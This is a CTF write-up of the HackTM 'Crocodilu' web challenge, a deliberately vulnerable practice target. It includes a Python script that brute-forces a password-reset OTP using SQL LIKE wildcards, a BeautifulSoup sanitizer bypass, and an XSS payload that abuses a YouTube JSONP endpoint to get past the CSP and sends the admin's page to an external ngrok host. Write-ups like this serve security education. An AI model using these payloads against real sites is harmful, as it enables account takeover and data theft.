<hr />

<h2>description: CSP bypass through unsupported www.youtube.com JSONP endpoint</h2>

<h1>Crocodilu</h1>

<h2>Description</h2>

<blockquote>
  <p>Check out my new video sharing platform!</p>
</blockquote>

<p>{% file src="../../.gitbook/assets/23-web-crocodilu-main.tar.gz" %}</p>

<h2>Solution</h2>

<ol>
<li><a href="crocodilu.md#gaining-access">Gaining access through SQL <code>LIKE</code> injection</a></li>
<li><a href="crocodilu.md#bypassing-html-sanitization">Bypassing HTML sanitization through parser differential between BeautifulSoup and browsers</a></li>
<li><a href="crocodilu.md#abusing-youtube-jsonp-endpoint">Bypassing strict CSP through unsupported <code>www.youtube.com</code> JSONP endpoint</a></li>
</ol>

<h3>Gaining Access</h3>

<p>The first thing we needed to do was to gain access to the application. We can register a new user, but attempting to log in as that user would result in a "User not active" error.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 6.06.25 PM.png" alt=""><figcaption></figcaption></figure>

<p>Taking a look at <code>auth.py</code>, we would see that a successful password reset at <code>/reset_password</code> would set <code>user.active</code> to <code>True</code>, allowing us to access the app.</p>

<p>```python
def reset_password():</p>

<pre><code>...

if user and not user.admin:
    user.code = None
    user.password = generate_password_hash(password)
    user.active = True
    db.session.commit()
    return redirect(url_for('login'))
</code></pre>

<p>```</p>

<p>To do so, we first have to request an OTP at <code>/request_code</code>. This sets <code>user.code</code> to a random 4-digit number.</p>

<p>```python
def request_code():</p>

<pre><code>...

user = User.query.filter(User.email.like(email)).first()

if user:
    if user.admin:
        return render_template('request_code.html',
                               error='Admins cannot reset their password')

    user.code = ''.join(random.choices(string.digits, k=4))
    # TODO: send email with code, will fix this next release

    db.session.commit()

    return redirect(url_for('reset_password'))
else:
    return render_template('request_code.html', error='Invalid email')
</code></pre>

<p>```</p>

<p>If no rate limiting is enforced on <code>/reset_password</code>, a 4-digit OTP would be trivial to brute-force. However, in this case, rate limiting is enforced on a per-email basis through a Redis store.</p>

<p>```python
email = request.form['email'].strip()
if not is<em>valid</em>email(email):
    return render<em>template('request</em>code.html', error='Invalid email')</p>

<p>reqs = redis.get(email)
if reqs is not None and int(reqs) &gt; 2:
    return render<em>template('reset</em>password.html',
                           error='Too many requests')
else:
    if reqs is None:
        redis.set(email, '1')
    else:
        redis.incr(email)
    redis.expire(email, 3600)
```</p>

<p>When a guess at the OTP is made, the value for the corresponding email address is incremented by 1. After 3 attempts, any further attempts for the same email address are blocked.</p>

<p>Interestingly, the SQL query that checks the OTP code uses the <code>LIKE</code> operator.</p>

<p>```python
code = request.form['code'].strip()
if not code.isdigit():
    return render<em>template('reset</em>password.html', error='Invalid code')</p>

<p>password = request.form['password']
user = User.query.filter(User.email.like(email)
                         &amp; User.code.like(code)).first()
```</p>

<p>The final query is something like</p>

<p><code>sql
SELECT * FROM users WHERE email LIKE "email" AND code LIKE "code"
</code></p>

<p>which means that if we can insert the <code>%</code> wildcard at the start or end of either <code>email</code> or <code>code</code>, there's a good chance we can bypass the check in reasonable time.</p>

<p>Unfortunately, <code>code</code> is checked using <code>code.isdigit()</code>. Let's see if we can get past <code>is_valid_email(email)</code> instead.</p>

<p><code>python
def is_valid_email(email: str) -&gt; bool:
    email_pattern = re.compile(r"[0-9A-Za-z]+@[0-9A-Za-z]+\.[a-z]+")
    return email_pattern.match(email) is not None
</code></p>

<p>The regular expression does not allow for special characters like <code>%</code>. However, <a href="https://docs.python.org/3/library/re.html">re.match</a> only matches at the <em>beginning</em> of the string, so this still allows for wildcards at the <em>end</em> of the email.</p>

<blockquote>
  <p>If zero or more characters at the beginning of <em>string</em> match the regular expression <em>pattern</em>, return a corresponding match object. Return <code>None</code> if the string does not match the pattern; note that this is different from a zero-length match.&#x20;</p>
</blockquote>

<p>There are two possibilities here - the first one is to create many accounts sharing the same prefix in their emails, increasing the chance that any code would be valid for <code>some@email.prefix%</code>. Because the registration form is reCAPTCHA-protected, this is not possible.</p>

<p>The approach we take instead relies on the ability to add any number of <code>%</code> characters at the end of the email. Because <code>%</code> matches 0 or more characters, the query will yield the same result no matter how many <code>%</code> characters are added.</p>

<p>```python
import grequests
import sys</p>

<p>EMAIL = "socengexp@socengexp.socengexp"
PASSWORD = "socengexp12345!"</p>

<p>for i in range(0, 10000, 100):</p>

<pre><code>print(f"Trying {i}")

results = grequests.map(grequests.post("http://34.141.16.87:25000/reset_password", data={
    "email": EMAIL + "%" * (i + j),
    "code": str(i + j).zfill(4),
    "password": PASSWORD
}) for j in range(100))

for r in results:
    if "Invalid email or code" not in r.text:
        print(r.text)
        sys.exit(0)
</code></pre>

<p>```</p>

<p>Using this script, we can brute force the entire OTP space within a few minutes.</p>

<h3>Bypassing HTML Sanitization</h3>

<p>Now that we are in, where is the flag? When the container first starts up a post is made containing the flag. The post is admin-only, which means we need to stage a client-side attack against the admin.</p>

<p><code>python
with app.app_context():
    db.create_all()
    if not User.query.filter(User.email.like('admin@hacktm.ro')).first():
        user = User(name='admin',
                    email='admin@hacktm.ro',
                    password=generate_password_hash(
                        os.getenv('ADMIN_PASSWORD', 'admin')),
                    active=True,
                    admin=True)
        db.session.add(user)
        post = Post(title='Welcome to Crocodilu', content=os.getenv('FLAG', 'HackTM{example}'), author=user)
        db.session.add(post)
        db.session.commit()
</code></p>

<p>Our first hurdle is <a href="https://beautiful-soup-4.readthedocs.io/en/latest/">BeautifulSoup</a>. Our HTML content is parsed and checked for any blacklisted tags. Combined with a restrictive CSP, this greatly restricts what we can do.</p>

<p>```python
@app.route('/create<em>post', methods=['GET', 'POST'])
@login</em>required
def create_post():
    blacklist = ['script', 'body', 'embed', 'object', 'base', 'link', 'meta', 'title', 'head', 'style', 'img', 'frame']</p>

<pre><code>if current_user.admin:
    return redirect(url_for('profile'))
form = PostForm()
if form.validate_on_submit():
    content = form.content.data
    soup = BeautifulSoup(content, 'html.parser')
    for tag in blacklist:
        if soup.find(tag):
            content = 'Invalid YouTube embed!'
            break

    for iframe in soup.find_all('iframe'):
        if iframe.has_attr('srcdoc') or not iframe.has_attr('src') or not iframe['src'].startswith('https://www.youtube.com/'):
            content = 'Invalid YouTube embed!'
            break

    post = Post(title=form.title.data,
                content=content,
                author=current_user)
    db.session.add(post)
    db.session.commit()
    flash('Your post has been created!', 'success')
    return redirect(url_for('profile'))
return render_template('create_post.html', title='Create Post', form=form)
</code></pre>

<p>```</p>

<p>Luckily for us, the built-in <code>html.parser</code> does not treat malformed HTML the same way as a standards-compliant HTML5 parser would. There is a <a href="https://beautiful-soup-4.readthedocs.io/en/latest/#differences-between-parsers">section</a> dedicated to this in the documentation.</p>

<p>One trick to exploit this parser differential is through HTML comments. Consider the following payload:</p>

<p><code>
&lt;!--&gt;&lt;script&gt;alert(1)&lt;/script&gt;--&gt;
</code></p>

<p>BeautifulSoup thinks that the comment spans the entire payload, ending at <code>--&gt;</code>.</p>

<p>```python</p>

<blockquote>
  <blockquote>
    <blockquote>
      <p>from bs4 import BeautifulSoup
      BeautifulSoup("<!--><script>alert(1)</script>-->", "html.parser").find_all()
      []
      ```</p>
    </blockquote>
  </blockquote>
</blockquote>

<p>However, a HTML5 parser would accept <code>&lt;!--&gt;</code> as a valid comment. We can test this out on any modern browser using a <a href="https://software.hixie.ch/utilities/js/live-dom-viewer/">DOM viewer</a>.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 7.37.24 PM.png" alt=""><figcaption></figcaption></figure>

<h3>Abusing YouTube JSONP Endpoint</h3>

<p>Now that we can inject arbitrary HTML, we have to get past the rather restrictive CSP that is applied on all pages through the Nginx proxy.</p>

<p>{% code overflow="wrap" %}
<code>properties
add_header Content-Security-Policy "default-src 'self' www.youtube.com www.google.com/recaptcha/ www.gstatic.com/recaptcha/ recaptcha.google.com/recaptcha/; object-src 'none'; base-uri 'none';";
</code>
{% endcode %}</p>

<p>Throwing this into Google's <a href="https://csp-evaluator.withgoogle.com/">CSP evaluator</a> shows us that <code>www.youtube.com</code> might host JSONP endpoints that we can abuse.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 7.22.54 PM.png" alt=""><figcaption></figcaption></figure>

<p>If so, we could use something like&#x20;</p>

<pre class="language-html"><code class="lang-html"><strong>&#x3C;script src="https://www.youtube.com/some_jsonp_endpoint?callback=alert">&#x3C;/script> 
</strong></code></pre>

<p>to achieve an XSS.</p>

<p>But <em>where</em>? The evaluator is checking against a pre-defined list of known JSONP endpoints <a href="https://github.com/google/csp-evaluator/blob/master/allowlist_bypasses/json/jsonp.json">here</a>. The only one that matches <code>www.youtube.com</code> is:</p>

<p><code>
"//www.youtube.com/profile_style"
</code></p>

<p>which seems to be outdated because visiting that URL just brings us to a YouTube profile called "Profile Style".</p>

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 7.26.26 PM.png" alt=""><figcaption></figcaption></figure>

<p>At this point, I tried getting Burp Suite to insert a <code>callback=</code> parameter to all JSON endpoints requested using an extension like <a href="https://github.com/kapytein/jsonp">this one</a> and using YouTube as a normal user, hoping to get lucky.</p>

<p>Alas, this did not yield any results. After sleeping off my frustration, I came back to this challenge when my teammate sent a link to an obscure issue on <a href="https://issuetracker.google.com/issues/35171971">Google's issue tracker</a>.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 7.36.27 PM.png" alt=""><figcaption></figcaption></figure>

<p>This didn't seem very helpful. After all, Google decided <em>not</em> to implement JSONP on the <code>/oembed</code> API, right? Using the <code>callback</code> parameter seems to have no effect.</p>

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 7.39.55 PM.png" alt=""><figcaption></figcaption></figure>

<p>But when I randomly tried using <code>alert();</code> instead of <code>alert</code>, the following response was returned.</p>

<p>{% code overflow="wrap" %}
<code>javascript
// API callback
alert();({
  "error": {
    "code": 400,
    "message": "Invalid JSONP callback name: 'alert();'; only alphabet, number, '_', '$', '.', '[' and ']' are allowed.",
    "status": "INVALID_ARGUMENT"
  }
}
);
</code>
{% endcode %}</p>

<p>Wait, did I just trigger a JSONP response? For some reason, using a "valid" callback name does not elicit a JSONP response, but an "invalid" one yields a JSONP response saying that the callback name is invalid. That's really weird and ironic.</p>

<p>With our <code>callback</code> parameter reflected into the response, we can now inject arbitrary JavaScript code. The only restrictions are that quotes and angle brackets are escaped.</p>

<p>To exfiltrate the contents of the admin's <code>/profile</code> page, the following <code>callback</code> value can be used.</p>

<p>{% code overflow="wrap" %}
<code>javascript
&amp;callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?` btoa(txt)})
</code>
{% endcode %}</p>

<p>Combined with the BeautifulSoup bypass above, the final payload we submit is:</p>

<p>{% code overflow="wrap" %}
<code>
&lt;!--&gt;&lt;script src="https://www.youtube.com/oembed?url=http://www.youtube.com/watch?v=bDOYN-6gdRE&amp;format=json&amp;callback=fetch(`/profile`).then(function f1(r){return r.text()}).then(function f2(txt){location.href=`https://b520-49-245-33-142.ngrok.io?`+btoa(txt)})"&gt;&lt;/script&gt;--&gt;
</code>
{% endcode %}</p>

<p>We can then find the URL of the post containing the flag:</p>

<p>```html
...</p>

<h1>admin's Posts</h1>

<ul class="list-group">

    <li class="list-group-item">
        <a href="/post/68a30ae2-a8f3-4d12-9ffa-0564a3a7177b">Welcome to Crocodilu</a>
        <span class="float-right">2023-02-18</span>
    </li>

</ul>

<p>...
```</p>

<p>and repeat this one more time to fetch <code>/post/68a30ae2-a8f3-4d12-9ffa-0564a3a7177b</code> instead.</p>

<p>```markup
...</p>

<article class="media content-section">
  <div class="media-body">
    <h2>Welcome to Crocodilu</h2>
    <p class="article-content">HackTM{trilulilu_crocodilu_xssilu_9bc3af}</p>
    <small class="text-muted">2023-02-18</small>
  </div>
</article>

<p>...
```</p>
